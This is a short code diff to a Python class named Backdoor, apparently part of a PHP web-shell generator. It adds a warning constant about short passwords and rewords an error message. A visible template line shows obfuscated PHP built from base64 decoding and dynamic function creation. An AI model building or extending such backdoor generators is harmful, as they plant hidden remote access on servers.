@@ -23,6 +23,8 @@ from pollution import pollute_with_static_str
 from core.utils import randstr
 from core.moduleexception import ModuleException
 
+WARN_SHORT_PWD = 'Invalid password, use words longer than 3 characters'
+
 class Backdoor:
 
 	payload_template= """
@@ -50,7 +52,7 @@ $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLL
 	def __init__( self, password ):
 		
 		if len(password)<4:
-			raise ModuleException('generate','Password \'%s\' too short, choose another one' % password)
+			raise ModuleException('generate','\'%s\' %s' % (password, WARN_SHORT_PWD))
 		
 		self.password  = password
 		self.start_key = self.password[:2]
